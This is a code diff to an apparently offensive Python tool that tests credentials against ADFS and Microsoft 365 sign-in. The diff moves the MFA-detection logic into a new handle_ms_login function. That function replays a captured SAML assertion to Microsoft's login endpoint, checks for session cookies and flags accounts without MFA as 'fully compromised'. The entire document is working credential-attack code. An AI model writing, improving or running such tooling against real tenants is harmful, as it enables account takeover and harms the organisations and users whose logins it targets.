@@ -129,6 +129,48 @@ def check_authentication_cookies(login_srf_response):
     cookies = login_srf_response.cookies
     return "ESTSAUTHPERSISTENT" in cookies and "ESTSAUTH" in cookies
 
+def handle_ms_login(session, login_response, username, log_file, headers):
+    wresult_value = extract_saml_assertion(login_response)
+    if wresult_value:
+        login_srf_url = "https://login.microsoftonline.com/login.srf"
+        login_srf_payload = {
+            "wa": "wsignin1.0",
+            "wresult": wresult_value,
+        }
+
+        login_srf_response = session.post(
+            login_srf_url,
+            data=login_srf_payload,
+            headers=headers,
+            timeout=10,
+        )
+        login_srf_response.raise_for_status()
+
+        if (
+            login_srf_response.status_code == 200
+            and check_authentication_cookies(login_srf_response)
+        ):
+            if "BeginAuth" in login_srf_response.text:
+                log_message(
+                    f"[-] MFA required for: {username}",
+                    log_file,
+                    color=Fore.RED,
+                )
+            else:
+                log_message(
+                    f"[+] MFA not required for: {username}",
+                    log_file,
+                    color=Fore.GREEN,
+                )
+                log_message(
+                    f"[+] 🍾 {username} is fully compromised 🤌",
+                    log_file,
+                    color=Fore.MAGENTA,
+                )
+        else:
+            print(
+                f"{Fore.RED}[!] Unknown response checking MFA.{Style.RESET_ALL}"
+            )
 
 def send_login_request(
     target,
@@ -199,47 +241,7 @@ def send_login_request(
 
             if check_mfa:
                 if microsoft_checks_mfa:
-                    wresult_value = extract_saml_assertion(adfs_login_response)
-                    if wresult_value:
-                        login_srf_url = "https://login.microsoftonline.com/login.srf"
-                        login_srf_payload = {
-                            "wa": "wsignin1.0",
-                            "wresult": wresult_value,
-                        }
-
-                        login_srf_response = session.post(
-                            login_srf_url,
-                            data=login_srf_payload,
-                            headers=headers,
-                            timeout=10,
-                        )
-                        login_srf_response.raise_for_status()
-
-                        if (
-                            login_srf_response.status_code == 200
-                            and check_authentication_cookies(login_srf_response)
-                        ):
-                            if "BeginAuth" in login_srf_response.text:
-                                log_message(
-                                    f"[-] MFA required for: {username}",
-                                    log_file,
-                                    color=Fore.RED,
-                                )
-                            elif "/kmsi" or "KmsiInterrupt" in login_srf_response.text:
-                                log_message(
-                                    f"[+] MFA not required for: {username}",
-                                    log_file,
-                                    color=Fore.GREEN,
-                                )
-                                log_message(
-                                    f"[+] 🍾 {username} is fully compromised 🤌",
-                                    log_file,
-                                    color=Fore.MAGENTA,
-                                )
-                            else:
-                                print(
-                                    f"{Fore.RED}[!] Unknown response checking MFA.{Style.RESET_ALL}"
-                                )
+                    handle_ms_login(session, adfs_login_response, username, log_file, headers)
                 elif adfs_checks_mfa:
                     adfs_mfa_response = session.get(
                         adfs_login_response.headers["Location"],
@@ -255,17 +257,8 @@ def send_login_request(
                                 log_file,
                                 color=Fore.RED,
                             )
-                        elif "/kmsi" or "KmsiInterrupt" in adfs_mfa_response.text:
-                            log_message(
-                                f"[+] MFA not required for: {username}",
-                                log_file,
-                                color=Fore.GREEN,
-                            )
-                            log_message(
-                                f"[+] 🍾 {username} is fully compromised 🤌",
-                                log_file,
-                                color=Fore.MAGENTA,
-                            )
+                        elif "MSISAuth" in adfs_mfa_response.cookies:
+                            handle_ms_login(session, adfs_mfa_response, username, log_file, headers)
                         else:
                             print(
                                 f"{Fore.RED}[!] Unknown response checking MFA.{Style.RESET_ALL}"
